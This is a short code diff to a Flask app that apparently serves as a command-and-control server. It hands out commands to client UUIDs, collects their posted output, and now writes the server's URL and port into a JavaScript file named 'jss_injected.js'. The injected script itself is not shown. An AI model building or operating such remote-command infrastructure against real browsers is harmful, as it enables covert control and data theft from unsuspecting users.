@@ -7,6 +7,7 @@ import json
 
 @app.route('/')
 def index():
+    costume_jss_template(app.config)
     return render_template('index.html')
 
 
@@ -55,8 +56,8 @@ def get_command(client_uuid):
 def post_back():
     if request.method == 'POST':
         client_id = request.form.get('uuid', '')
-        cmd_id = request.form.get('cmd_id', '')
-        output = request.form.get('output', '')
+        cmd_id    = request.form.get('cmd_id', '')
+        output    = request.form.get('output', '')
 
         if client_id and cmd_id:
             c = Command.query.filter_by(id=cmd_id).first()
@@ -70,3 +71,13 @@ def post_back():
 @app.route('/jss')
 def get_js_file():
     return send_from_directory('static', filename='js/ugly.js')
+
+
+def costume_jss_template(config):
+    with open('app/static/js/jss_template.js', 'r') as template, \
+            open('app/static/js/jss_injected.js', 'w') as injected:
+
+        template_content = template.read().\
+            replace('{{ URL }}', config['URL']).\
+            replace('{{ PORT }}', str(config['PORT']))
+        injected.write(template_content)
